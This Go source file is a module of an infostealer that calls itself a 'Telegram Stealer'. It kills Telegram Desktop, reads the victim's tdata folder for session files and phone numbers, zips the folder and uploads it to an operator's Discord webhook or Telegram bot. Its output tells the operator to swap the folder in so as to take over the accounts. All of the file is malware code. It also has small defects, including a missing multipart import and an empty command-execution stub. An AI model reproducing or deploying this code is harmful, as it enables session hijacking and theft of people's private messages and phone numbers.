package telegram

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

type TelegramSession struct {
	UserID    int64  `json:"user_id"`
	FirstName string `json:"first_name"`
	LastName  string `json:"last_name"`
	Username  string `json:"username"`
	Phone     string `json:"phone"`
	Token     string `json:"token"`
	DataPath  string `json:"data_path"`
}

func Run(config map[string]interface{}) {
	webhook := config["webhook"].(string)
	telegramConfig := config["telegram"].(map[string]string)

	sendStatus(webhook, telegramConfig, "telegram", "📱 Telegram Stealer Started", "Initializing Telegram session stealing...")

	killTelegram()

	tdataPath := filepath.Join(os.Getenv("APPDATA"), "Telegram Desktop", "tdata")
	if _, err := os.Stat(tdataPath); os.IsNotExist(err) {
		sendStatus(webhook, telegramConfig, "telegram", "❌ Telegram Not Found", "Telegram Desktop not installed")
		return
	}

	sendStatus(webhook, telegramConfig, "telegram", "📁 TData Found", "Telegram tdata folder located")

	sessions := extractSessions(tdataPath)
	if len(sessions) == 0 {
		sendStatus(webhook, telegramConfig, "telegram", "⚠️ No Sessions Found", "No active Telegram sessions found")
	} else {
		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("✅ %d Sessions Found", len(sessions)), fmt.Sprintf("Found %d Telegram sessions", len(sessions)))
	}

	phones := extractPhones(tdataPath)
	if len(phones) > 0 {
		sendStatus(webhook, telegramConfig, "telegram", fmt.Sprintf("📱 %d Phones Found", len(phones)), fmt.Sprintf("Found %d phone numbers", len(phones)))
	}

	zipPath := createTDataZip(tdataPath)
	if zipPath != "" {
		sendStatus(webhook, telegramConfig, "telegram", "📦 TData Archived", "Telegram tdata folder compressed")
		sendFile(webhook, telegramConfig, zipPath)
		os.Remove(zipPath)
	}

	sessionInfo := formatSessionInfo(sessions, phones)
	sendMessage(webhook, telegramConfig, sessionInfo)

	sendStatus(webhook, telegramConfig, "telegram", "✅ Telegram Stealer Complete", "Telegram session stealing finished")
}

func killTelegram() {
	commands := []string{
		"taskkill /F /IM telegram.exe",
		"taskkill /F /IM telegram desktop.exe",
	}
	for _, cmd := range commands {
		execCmd(cmd)
	}
	time.Sleep(2 * time.Second)
}

func extractSessions(tdataPath string) []TelegramSession {
	var sessions []TelegramSession

	files, _ := ioutil.ReadDir(tdataPath)
	for _, file := range files {
		name := file.Name()
		if strings.HasPrefix(name, "D") && len(name) >= 8 {
			session := TelegramSession{
				DataPath: filepath.Join(tdataPath, name),
			}
			sessions = append(sessions, session)
		}
		if strings.HasSuffix(name, ".sess") {
			session := TelegramSession{
				DataPath: filepath.Join(tdataPath, name),
			}
			sessions = append(sessions, session)
		}
	}
	return sessions
}

func extractPhones(tdataPath string) []string {
	var phones []string
	phoneRegex := regexp.MustCompile(`\+\d{10,15}`)

	files, _ := ioutil.ReadDir(tdataPath)
	for _, file := range files {
		if file.IsDir() {
			continue
		}
		if strings.HasSuffix(file.Name(), ".sess") || strings.HasPrefix(file.Name(), "D") {
			data, err := ioutil.ReadFile(filepath.Join(tdataPath, file.Name()))
			if err == nil {
				matches := phoneRegex.FindAllString(string(data), -1)
				for _, match := range matches {
					if !contains(phones, match) {
						phones = append(phones, match)
					}
				}
			}
		}
	}
	return phones
}

func createTDataZip(tdataPath string) string {
	zipPath := filepath.Join(os.TempDir(), fmt.Sprintf("telegram_tdata_%d.zip", time.Now().Unix()))

	zipFile, err := os.Create(zipPath)
	if err != nil {
		return ""
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	filepath.Walk(tdataPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() {
			return nil
		}

		if strings.HasSuffix(info.Name(), ".tmp") || strings.HasSuffix(info.Name(), ".lock") {
			return nil
		}

		relPath, err := filepath.Rel(tdataPath, path)
		if err != nil {
			return nil
		}

		zipEntry, err := zipWriter.Create("Telegram/tdata/" + relPath)
		if err != nil {
			return nil
		}

		file, err := os.Open(path)
		if err != nil {
			return nil
		}
		defer file.Close()

		io.Copy(zipEntry, file)
		return nil
	})

	return zipPath
}

func formatSessionInfo(sessions []TelegramSession, phones []string) string {
	var output string
	output += "📱 TELEGRAM SESSIONS\n"
	output += "==================\n\n"

	if len(sessions) == 0 {
		output += "No Telegram sessions found.\n"
	} else {
		for i, session := range sessions {
			output += fmt.Sprintf("[Session %d]\n", i+1)
			output += fmt.Sprintf("Path: %s\n", session.DataPath)
			if len(phones) > i {
				output += fmt.Sprintf("Phone: %s\n", phones[i])
			}
			output += "\n"
		}
	}

	if len(phones) > 0 {
		output += "📱 PHONES FOUND\n"
		output += "===============\n\n"
		for _, phone := range phones {
			output += fmt.Sprintf("- %s\n", phone)
		}
		output += "\n"
	}

	output += "📦 TData Folder\n"
	output += "===============\n"
	output += "The complete tdata folder is attached as a ZIP file.\n"
	output += "To use: Replace your tdata folder with this one.\n"

	return output
}

func sendMessage(webhook string, telegramConfig map[string]string, message string) {
	if webhook != "" {
		sendDiscordMessage(webhook, message)
	}
	if telegramConfig["bot"] != "" && telegramConfig["chatid"] != "" {
		sendTelegramMessage(telegramConfig["bot"], telegramConfig["chatid"], message)
	}
}

func sendFile(webhook string, telegramConfig map[string]string, filePath string) {
	if webhook != "" {
		sendDiscordFile(webhook, filePath)
	}
	if telegramConfig["bot"] != "" && telegramConfig["chatid"] != "" {
		sendTelegramFile(telegramConfig["bot"], telegramConfig["chatid"], filePath)
	}
}

func sendStatus(webhook string, telegramConfig map[string]string, step, title, message string) {
	formatted := fmt.Sprintf(
		"**[%s]** `%s`\n`%s`\n`%s`",
		time.Now().Format("15:04:05"),
		title,
		message,
		step,
	)
	sendMessage(webhook, telegramConfig, formatted)
}

func sendDiscordMessage(webhook, message string) {
	payload := map[string]string{"content": message}
	jsonData, _ := json.Marshal(payload)
	http.Post(webhook, "application/json", bytes.NewBuffer(jsonData))
}

func sendDiscordFile(webhook, filePath string) {
	file, err := os.Open(filePath)
	if err != nil {
		return
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return
	}
	io.Copy(part, file)
	writer.Close()

	http.Post(webhook, writer.FormDataContentType(), body)
}

func sendTelegramMessage(botToken, chatID, message string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
	payload := map[string]string{
		"chat_id":    chatID,
		"text":       message,
		"parse_mode": "HTML",
	}
	jsonData, _ := json.Marshal(payload)
	http.Post(url, "application/json", bytes.NewBuffer(jsonData))
}

func sendTelegramFile(botToken, chatID, filePath string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)
	file, err := os.Open(filePath)
	if err != nil {
		return
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return
	}
	io.Copy(part, file)
	writer.WriteField("chat_id", chatID)
	writer.Close()

	http.Post(url, writer.FormDataContentType(), body)
}

func execCmd(cmd string) {}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}